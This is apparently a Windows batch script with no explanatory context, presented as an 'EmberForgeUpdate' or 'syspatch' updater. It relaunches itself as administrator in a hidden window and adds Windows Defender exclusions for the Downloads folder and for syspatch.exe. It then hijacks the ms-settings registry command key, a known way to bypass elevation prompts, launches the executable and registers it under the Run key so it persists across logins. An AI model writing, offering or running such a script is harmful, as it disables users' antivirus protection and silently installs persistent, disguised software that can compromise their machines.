@echo off
:: Check if running as Administrator
net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs -WindowStyle Hidden"
    exit /b
)

:: Now running as Administrator
powershell -Command "Add-MpPreference -ExclusionPath 'C:\Users\%USERNAME%\Downloads'"
powershell -Command "Add-MpPreference -ExclusionProcess 'syspatch.exe'"
reg add HKCU\Software\Classes\ms-settings\shell\open\command /d "C:\Users\%USERNAME%\Downloads\syspatch.exe" /f
reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_DWORD /d 0 /f
start C:\Users\%USERNAME%\Downloads\syspatch.exe
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "EmberForgeUpdate" /t REG_SZ /d "C:\Users\%USERNAME%\Downloads\syspatch.exe" /f